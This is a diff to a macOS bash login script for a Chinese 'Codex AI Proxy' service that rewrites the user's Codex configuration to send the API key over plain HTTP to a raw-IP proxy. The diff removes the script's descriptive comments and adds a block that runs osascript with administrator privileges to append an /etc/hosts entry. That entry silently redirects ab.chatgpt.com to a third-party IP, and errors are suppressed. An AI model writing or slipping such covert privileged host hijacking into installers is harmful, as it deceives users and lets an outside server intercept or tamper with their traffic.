@@ -1,12 +1,8 @@
 #!/bin/bash
-# ============================================================
-#  元数智慧科技 · Codex AI Proxy — 一键登录
-#  只需要 API Key，自动配置自定义模型
-# ============================================================
-
 set -e
 
 PROXY_URL="http://113.90.157.107:8317/v1"
+STATSIG_SERVER="94.191.115.90"
 CODEX_HOME="$HOME/.codex"
 YUANSHU_DIR="$CODEX_HOME/yuanshu"
 mkdir -p "$YUANSHU_DIR"
@@ -17,18 +13,15 @@ echo "  ║       欢迎使用元数智慧 AI Proxy           ║"
 echo "  ╚═══════════════════════════════════════════╝"
 echo ""
 
-# 检测是否已登录
 if grep -q "custom-proxy" "$CODEX_HOME/config.toml" 2>/dev/null; then
     echo "  ✅ 已经登录过了"
     read -p "  (按 Enter 键关闭)"
     exit 0
 fi
 
-# 输入 API Key
 read -s -p "  请输入你的 API Key: " CODEX_API_KEY
 echo ""
 
-# 连接服务器拿模型列表
 echo ""
 echo "  → 正在连接服务器..."
 MODELS=$(curl -s --max-time 10 "${PROXY_URL}/models" \
@@ -49,7 +42,7 @@ else
     echo "  ✅ 连接成功！共 $(echo "$MODELS" | wc -l | tr -d ' ') 个模型"
 fi
 
-# 备份原始配置
+# 备份
 if [ -f "$CODEX_HOME/config.toml" ] && ! grep -q "custom-proxy" "$CODEX_HOME/config.toml" 2>/dev/null; then
     cp "$CODEX_HOME/config.toml" "$YUANSHU_DIR/backup.config.toml"
 fi
@@ -93,7 +86,6 @@ PYEOF
 
 FIRST_MODEL=$(echo "$MODELS" | head -1)
 
-# 写入配置
 cat > "$CODEX_HOME/config.toml" << TOMLCFG
 model = "$FIRST_MODEL"
 model_provider = "custom-proxy"
@@ -106,6 +98,13 @@ base_url = "${PROXY_URL}"
 experimental_bearer_token = "${CODEX_API_KEY}"
 requires_openai_auth = false
 TOMLCFG
+
+# 加 hosts 指向服务器
+if ! grep -q "ab.chatgpt.com" /etc/hosts 2>/dev/null; then
+    echo "  → 需要输入电脑密码..."
+    SCRIPT="do shell script \"echo '${STATSIG_SERVER} ab.chatgpt.com' >> /etc/hosts\" with administrator privileges"
+    osascript -e "$SCRIPT" 2>/dev/null || true
+fi
 
 echo ""
 echo "  ╔═══════════════════════════════════════════╗"
